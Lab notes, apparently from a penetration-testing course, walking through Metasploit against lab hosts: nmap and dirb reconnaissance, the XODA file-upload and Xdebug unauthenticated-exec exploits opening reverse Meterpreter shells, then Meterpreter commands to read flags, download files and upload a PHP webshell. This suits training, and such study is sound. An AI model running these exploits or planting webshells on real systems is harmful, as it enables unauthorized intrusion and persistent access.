# Metasploit

## Vulnerable web server (XODA)

nmap scan
```
nmap -sS -sV 192.103.226.3   
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-30 05:01 UTC
Nmap scan report for target-1 (192.103.226.3)
Host is up (0.000025s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
MAC Address: 02:42:C0:67:E2:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

Do a curl to find web app name - XODA
```
curl 192.103.226.3
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
```

Metasploit
```
msf5 > use exploit/unix/webapp/xoda_file_upload
msf5 exploit(unix/webapp/xoda_file_upload) > set RHOSTS 192.103.226.3
RHOSTS => 192.103.226.3
msf5 exploit(unix/webapp/xoda_file_upload) > set LHOSTS 192.103.226.2
LHOSTS => 192.103.226.2
msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.103.226.2:4444 
[*] Sending PHP payload (VyFtUyjj.php)
[*] Executing PHP payload (VyFtUyjj.php)
[*] Sending stage (38247 bytes) to 192.103.226.3
[*] Meterpreter session 1 opened (192.103.226.2:4444 -> 192.103.226.3:51376) at 2021-03-30 05:04:47 +0000
[!] Deleting VyFtUyjj.php

meterpreter > 
```

## Meterpreter basics


Endpoint found with dirb
```
dirb http://192.115.96.3
...

curl http://192.115.96.3/phpinfo.php
...
<tr><td class="e">DBGp - Common DeBuGger Protocol </td><td class="v">$Revision: 1.145 $ </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">xdebug.auto_trace</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">xdebug.cli_color</td><td class="v">0</td><td class="v">0</td></tr>
...
```

metasploit
```
msf5 > use exploit/unix/http/xdebug_unauth_exec
msf5 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS 192.115.96.3
RHOSTS => 192.115.96.3
msf5 exploit(unix/http/xdebug_unauth_exec) > set LHOST 192.115.96.2
LHOST => 192.115.96.2
msf5 exploit(unix/http/xdebug_unauth_exec) > run

[*] Started reverse TCP handler on 192.115.96.2:4444 
[*] 192.115.96.3:80 - Waiting for client response.
[*] 192.115.96.3:80 - Receiving response
[*] 192.115.96.3:80 - Shell might take upto a minute to respond.Please be patient.
[*] 192.115.96.3:80 - Sending payload of size 2026 bytes
[*] Sending stage (38247 bytes) to 192.115.96.3
[*] Meterpreter session 1 opened (192.115.96.2:4444 -> 192.115.96.3:58244) at 2021-03-30 08:29:00 +0000

meterpreter > 
```

Show remote present working directory and dir listing

```
meterpreter > pwd
/app
meterpreter > ls
Listing: /app
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   4096   dir   2016-02-15 10:35:00 +0000  .git
40755/rwxr-xr-x   4096   dir   2021-03-30 08:25:50 +0000  .xoda
100777/rwxrwxrwx  10273  fil   2016-02-15 10:35:00 +0000  LICENSE
100777/rwxrwxrwx  8703   fil   2018-10-05 18:41:42 +0000  README
...
```

Show local present working directory and dir listing

```
meterpreter > lpwd
/root
meterpreter > lls
Listing Local: /root
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  570   fil   2017-10-30 12:46:42 +0000  .bashrc
40700/rwx------   4096  dir   2021-03-30 08:26:03 +0000  .cache
40755/rwxr-xr-x   4096  dir   2021-03-30 08:28:16 +0000  .msf4
40755/rwxr-xr-x   4096  dir   2019-05-26 16:35:23 +0000  .npm
100644/rw-r--r--  148   fil   2017-10-30 12:46:42 +0000  .profile
100644/rw-r--r--  13    fil   2019-02-07 07:54:01 +0000  .vimrc
100644/rw-r--r--  165   fil   2019-05-26 16:35:28 +0000  .wget-hsts
100644/rw-r--r--  293   fil   2019-02-07 07:54:01 +0000  README
40755/rwxr-xr-x   4096  dir   2019-05-26 16:36:00 +0000  tools
40755/rwxr-xr-x   4096  dir   2019-02-07 07:54:01 +0000  wordlists
```

Change local dir
```
meterpreter > lcd tools
```

Read file
```
meterpreter > cat flag1
5c50a439f040922188a22f88cecc5277
```

Enter vim
```
meterpreter > edit flag1
```

Download files to local machine
```
meterpreter > download flag5.zip
[*] Downloading: flag5.zip -> flag5.zip
[*] Downloaded 208.00 B of 208.00 B (100.0%): flag5.zip -> flag5.zip
[*] download   : flag5.zip -> flag5.zip
```

Search for a file (with \*ackdo\*)
```
meterpreter > search -d /usr/bin -f *ckdo*
Found 1 result...
    /usr/bin\backdoor (66 bytes)
```

Upload file to remote machine
```
meterpreter > upload /usr/share/webshells/php/php-backdoor.php
[*] uploading  : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
[*] Uploaded -1.00 B of 2.73 KiB (-0.04%): /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
[*] uploaded   : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
```

